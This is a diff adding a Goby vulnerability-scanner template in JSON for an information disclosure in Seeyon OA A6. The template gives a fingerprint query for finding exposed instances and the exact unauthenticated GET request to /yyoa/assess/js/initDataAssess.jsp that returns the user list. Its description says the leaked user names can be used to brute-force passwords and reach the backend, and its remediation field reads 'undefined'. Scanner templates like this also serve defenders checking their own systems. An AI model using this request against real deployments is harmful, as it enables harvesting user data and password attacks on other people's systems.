@@ -1,0 +1,60 @@
+{
+      "Name": "Seeyon OA A6 initDataAssess.jsp User information leakage",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"Yonyou-Seeyon-OA\" && body=\"致远协创A6\"",
+      "Description": "Seeyon OA A6 initDataAssess.jsp There is leakage of user sensitive information\nYou can get the user name blasting user password into the background to further attack",
+      "Product": "Seeyon OA A6",
+      "Homepage": "https://www.seeyon.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>User name explodes, user password enters the background to further attack<br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/yyoa/assess/js/initDataAssess.jsp",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "personList",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "/yyoa/index.jsp",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-05 10:33:26",
+      "GobyVersion": "1.8.255"
+}
